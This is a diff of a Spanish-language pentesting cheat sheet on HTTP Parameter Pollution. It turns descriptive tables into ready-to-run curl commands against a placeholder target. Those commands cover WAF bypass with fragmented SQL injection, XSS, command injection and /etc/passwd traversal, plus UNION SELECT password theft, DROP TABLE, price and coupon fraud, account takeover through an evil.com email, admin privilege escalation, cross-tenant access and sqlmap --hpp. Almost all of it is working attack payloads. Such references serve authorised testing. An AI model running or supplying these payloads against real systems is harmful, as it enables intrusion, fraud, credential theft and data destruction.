@@ -24,31 +24,15 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Differential parser confusion | Frontend WAF reads first param, backend reads second → bypass | Standard. |
-| Auth check on first param | `?user=admin&user=victim` — auth checks `admin`, action on `victim` | Bypass. |
-| Permission tied to first | First param validated, second processed | Direct. |
-| Admin endpoint dual params | `?action=read&action=delete` — auth on read, exec delete | Privesc. |
-| Proxy normalizes, app processes | Proxy sees one, app sees both | Differential. |
-| Header-based vs query-based | Param en header validated, en URL processed | Source confusion. |
-| Cookie validation vs query | Cookie auth check, query param ignored | Edge. |
-| Combine con verb tampering | POST con duplicate GET param | Multi-vector. |
-| Combine con method override | `_method=DELETE` con multiple values | Compound. |
-| GraphQL field aliasing analog | Multi-aliased same field | GraphQL adjacent. |
-| OAuth state confusion | Multiple `state=` values en authz request | Federation chain. |
+| `curl "https://target/admin/action?user=admin&user=attacker"` | Front WAF ve `admin` (allowlisted), backend (PHP last-wins) procesa `attacker` → action como atacante | PHP/Ruby last-wins. |
+| `curl "https://target/admin?action=read&action=delete"` | Auth check sobre `read`, exec sobre `delete` | Multi-action endpoint. |
+| `curl "https://target/admin?role=admin&role=user"` (Java first-wins) | Java toma primero `admin`, backend logic sobre último `user` | Stack differential. |
+| `curl -X POST -d "user=admin&user=attacker" https://target/admin/action` | Body HPP variant | Form-encoded body. |
+| `curl -H "Cookie: user=admin" "https://target/admin?user=attacker"` | Cookie auth check, query param processed | Source confusion. |
+| `curl -X POST -d "_method=DELETE&action=read&action=delete" https://target/admin` | Method override + HPP combo | Compound. |
+| `curl "https://target/oauth/authz?state=safe&state=attacker"` | OAuth state confusion | Federation chain. |
+| `for combo in 'user=admin&user=attacker' 'user=attacker&user=admin'; do curl "https://target/admin?$combo"; done` | Bulk first/last differential probe | Discovery. |
 ^hpp-server-auth
-
-### PoC auth bypass via HPP
-
-```bash
-# Backend: 
-#   if user == 'admin': require_super_auth()
-#   else: do_action(user)
-
-# Atacante: PHP backend (last value wins)
-curl "https://target/admin/action?user=admin&user=attacker"
-# Frontend WAF: sees user=admin, blocks. NOT applied per behavior.
-# Or: WAF checks first 'admin' (allowlisted), backend uses 'attacker' (last) → action as attacker.
-```
 
 ___
 
@@ -56,35 +40,27 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | WAF inspects param value. If value split via duplicate param + concatenation, WAF misses pattern. | ASP.NET specific. |
-| ASP.NET concat | `?q=SELECT&q=*&q=FROM&q=users` → backend gets `SELECT,*,FROM,users` | SQL fragments. |
-| WAF only inspects first | `?q=safe&q=<malicious>` | Direct bypass. |
-| WAF only inspects last | `?q=<malicious>&q=safe` | Same. |
-| Concat with comma | If backend uses concatenated value en query | SQLi via fragments. |
-| XSS payload split | `?q=<scr&q=ipt>alert(1)</scr&q=ipt>` | Fragmented. |
-| Command injection split | `?cmd=ls&cmd=;&cmd=cat&cmd=/etc/passwd` | Fragmented. |
-| Path traversal split | `?file=..&file=/&file=etc&file=passwd` | Fragmented. |
-| Combine con encoding | `?q=%3C&q=script%3E` | Multi-encoding bypass. |
-| Bypass content-length checks | Smaller individual values | Edge. |
-| Combine con HRS | Smuggle with multi-param request | Compound. |
-| WAF rule order | Some WAFs only check first match | Per-WAF. |
+| `curl 'https://target/search?q=SELECT&q=*&q=FROM&q=users'` | ASP.NET concat → `SELECT,*,FROM,users` SQLi fragmented | ASP.NET backend. |
+| `curl 'https://target/search?q=<scr&q=ipt>alert(1)</scr&q=ipt>'` | XSS payload fragmented por param split | WAF inspecciona individual values. |
+| `curl 'https://target/cmd?c=ls&c=;&c=cat&c=/etc/passwd'` | Command injection fragmented | ASP.NET concat con comma. |
+| `curl 'https://target/file?f=..&f=/&f=etc&f=passwd'` | Path traversal fragmented | Stack-specific concat. |
+| `curl 'https://target/?q=%3C&q=script%3E&q=alert(1)&q=%3C/script%3E'` | URL-encoded multi-param XSS bypass | Encoding combo. |
+| `curl 'https://target/?q=safe&q=<malicious>'` | WAF only inspects first → bypass | First-only WAF. |
+| `curl 'https://target/?q=<malicious>&q=safe'` | WAF only inspects last → bypass | Last-only WAF. |
+| `for split in 'SELECT&q=*&q=FROM&q=users' 'SELECT *&q= FROM&q= users' 'SE&q=LECT&q= * FROM users'; do curl "https://target/search?q=$split"; done` | Bulk fragmentation probe | WAF testing. |
 ^hpp-server-waf
 
 ### PoC WAF bypass
 
 ```bash
-# Stack: ASP.NET (concatenates duplicates with comma)
-
-# Without HPP — blocked by WAF
+# Without HPP — blocked
 curl 'https://target/search?q=SELECT * FROM users'
 # WAF blocks: SQL injection signature
 
-# With HPP — split into fragments
+# With HPP (ASP.NET concatenates)
 curl 'https://target/search?q=SELECT&q=*&q=FROM&q=users'
-# Each individual param value benign
-# ASP.NET concatenates: "SELECT,*,FROM,users"
-# Backend receives, executes as SQL
-# WAF sees individual benign params, no signature match → bypass
+# Each individual param benign → WAF no match
+# Backend gets "SELECT,*,FROM,users" → executes
 ```
 
 ___
@@ -93,18 +69,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| State machine confusion | `?step=1&step=3` → skip step 2 | Skip flow. |
-| Multi-step purchase | `?action=add&action=checkout` | Skip approval. |
-| Approval workflow | `?status=pending&status=approved` | Bypass review. |
-| Voting / rating | `?vote=up&vote=up` con app que dedupes by source | Edge. |
-| Discount / coupon | `?coupon=A&coupon=B` apply both | Multi-coupon. |
-| Quantity manipulation | `?qty=1&qty=100` | Stock bypass. |
-| Price manipulation | `?price=100&price=1` | If editable. |
-| Combine con Mass Assignment | Mass assign via duplicate field | Compound. |
-| Form field injection | Multi-field con same name | Edge. |
-| Email change | `?email=victim&email=attacker` | ATO chain. |
-| Role parameter | `?role=user&role=admin` | Privesc. |
-| Tenant ID manipulation | `?tenant=A&tenant=B` cross-tenant | Multi-tenant escape. |
+| `curl "https://target/checkout?step=1&step=3"` | Skip step 2 — multi-step state machine bypass | State validation. |
+| `curl "https://target/cart?action=add&action=checkout"` | Skip approval step | Multi-action endpoint. |
+| `curl "https://target/order?status=pending&status=approved"` | Bypass review workflow | Approval bypass. |
+| `curl "https://target/coupon?code=DISCOUNT10&code=DISCOUNT50"` | Apply ambos coupons | Multi-coupon stack. |
+| `curl -X POST -d "qty=1&qty=100" https://target/cart/add` | Quantity manipulation | Stock bypass. |
+| `curl -X POST -d "price=100&price=1" https://target/checkout` | Price manipulation | Price field editable. |
+| `curl -X POST -d "email=victim@target.com&email=attacker@evil.com" https://target/profile/update` | Email change ATO chain | Profile update HPP. |
+| `curl -X POST -d "role=user&role=admin" https://target/users/123` | Role privesc via duplicate | Mass Assignment + HPP. |
+| `curl "https://target/api?tenant=A&tenant=B"` | Cross-tenant escape | Multi-tenant logic. |
 ^hpp-server-logic
 
 ___
@@ -113,17 +86,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| ASP.NET concat | `?id=1&id=' UNION SELECT * FROM users -- ` | Backend receives `1,' UNION SELECT...`. |
-| Escape single quote | If first param contains escape, second injects | Edge. |
-| Combine sqlmap | `sqlmap --hpp` flag | Built-in. |
-| Java getParameterValues con concatenation logic | If app concats array | Edge. |
-| Custom backend logic | If app loops over param values en query | Per-app. |
-| Bypass single-quote filter | Combine quotes en split params | Encoding combo. |
-| Bypass length filter | Multiple smaller params | Bypass. |
-| Combine con stacked queries | `?id=1&id=;DROP TABLE users` | Multi-statement. |
-| LDAP injection adjacent | LDAP filter con HPP | Adjacent. |
-| NoSQL filter bypass | Mongoose query con duplicate | Adjacent. |
-| GraphQL aliasing | Same effect en mutations | Adjacent. |
+| `curl "https://target/api?id=1&id=' UNION SELECT username,password FROM users-- "` | ASP.NET concat → `1,' UNION SELECT...` SQLi | ASP.NET concat con comma. |
+| `sqlmap -u "https://target/api?id=1" --hpp` | sqlmap built-in HPP mode | Auto-explotar. |
+| `curl "https://target/api?id=1&id=;DROP TABLE users--"` | Stacked queries via concat | Multi-statement support. |
+| `curl "https://target/api?id=1&id=' OR '1'='1"` | Bypass quote filter via fragments | Encoding combo. |
+| `curl "https://target/search?q=SELECT&q=username,password&q=FROM&q=users"` | Fragment SQL via espacios | ASP.NET specific. |
+| `curl --data-urlencode "id[]=1" --data-urlencode "id[]=' OR 1=1--" https://target/api` | Array notation con SQLi | Java/PHP array. |
 ^hpp-server-sqli
 
 ___
@@ -132,16 +100,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Body con duplicate field | `name=test&isAdmin=false&isAdmin=true` | If last wins → admin. |
-| Override sensitive field | First "safe" value, second "evil" value | Direct. |
-| Combine con framework param parsing | Per-framework behavior decides | Stack-aware. |
-| Form-encoded vs JSON | Different parsers behave differently | Multi-source. |
-| GraphQL input duplicate | `mutation { update(input: {name:"x", role:"user", role:"admin"}) }` | GraphQL. |
-| Combine con field whitelist bypass | Whitelist on first, exec on last | Standard. |
-| Multipart form duplicate | Multiple form-data fields | Edge. |
-| Combine con array notation | `roles[]=user&roles[]=admin` | Type confusion. |
-| Combine con type juggling | Different types for same field | Edge. |
-| Per-stack behavior | Test which value persisted | Per-app. |
+| `curl -X POST -d "name=test&isAdmin=false&isAdmin=true" https://target/users/123` | Last-wins → isAdmin=true persistido | PHP/Ruby last-wins. |
+| `curl -X POST -d "role=user&role=admin" https://target/users/123` | Role privesc via duplicate | Mass Assign + HPP. |
+| `curl -X POST -H "Content-Type: application/json" -d '{"name":"x","isAdmin":false}' "https://target/users/123?isAdmin=true"` | Body+query HPP | Multi-source merge. |
+| `curl -X POST -d "name=x&permissions=read&permissions=write&permissions=admin" https://target/users/123` | Array-style mass assign | Multi-value persistence. |
+| `curl -X POST -F "name=x" -F "isAdmin=false" -F "isAdmin=true" https://target/users/123` | Multipart con duplicate | Multipart parser. |
+| `{"query":"mutation{update(input:{name:\"x\",role:\"user\",role:\"admin\"}){id}}"}` (GraphQL) | Aliased mutation HPP | GraphQL adjacent. |
+| `curl -X POST -d "roles[]=user&roles[]=admin" https://target/users/123` | Array notation HPP | Type-confusion variant. |
 ^hpp-server-mass-assign
 
 ***
